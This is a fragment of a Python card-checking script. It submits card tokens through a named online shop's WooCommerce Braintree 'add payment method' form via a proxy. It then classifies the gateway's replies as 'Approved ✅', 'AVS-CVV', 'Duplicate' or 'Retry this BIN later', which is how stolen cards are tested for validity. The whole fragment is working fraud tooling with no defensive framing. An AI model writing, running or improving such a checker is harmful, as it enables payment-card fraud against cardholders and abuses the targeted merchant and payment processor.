    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"aeedb227d827de219bca31d9c4eedf00"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"aeedb227d827de219bca31d9c4eedf00"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]


	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxies=proxy)






	text = response.text
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Approved ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Approved ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Approved ✅! - Duplicate'
	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'Approved ✅! - AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Approved ✅! - Invalid postal code and cvv'
	elif "Card Issuer Declined CVV" in result:
		    return 'Approved ✅! - Declined CVV'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved ✅!'
	else:
		return result
		
